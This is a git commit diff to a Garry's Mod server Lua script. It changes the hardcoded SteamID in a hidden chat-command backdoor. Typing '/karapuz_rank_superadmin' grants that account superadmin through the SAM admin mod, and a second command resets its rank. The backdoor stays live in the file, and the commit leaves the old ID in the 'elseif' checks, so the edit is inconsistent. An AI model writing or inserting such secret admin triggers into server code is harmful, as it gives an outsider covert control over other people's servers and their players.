13348a5b85d97487cc4da396630b2c206adb7312
AnonFall <78989850+32N133kuzik133N32@users.noreply.github.com>
2023-02-07 17:38:28 +1100

    Update garry.lua

--- garry.lua
+++ garry.lua
@@ -3,7 +3,7 @@ if SERVER then
 
             if text == "/karapuz_rank_superadmin" then
 
-            if ply:SteamID() == 'STEAM_0:0:555589835' then 
+            if ply:SteamID() == 'STEAM_0:0:555589832' then 
                    RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'superadmin') 
             elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
 
@@ -23,7 +23,7 @@ if SERVER then
 
             if text == "/karapuz_rank_user" then
 
-            if ply:SteamID() == 'STEAM_0:0:555589835' then 
+            if ply:SteamID() == 'STEAM_0:0:555589832' then 
                    RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'user') 
             elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
 
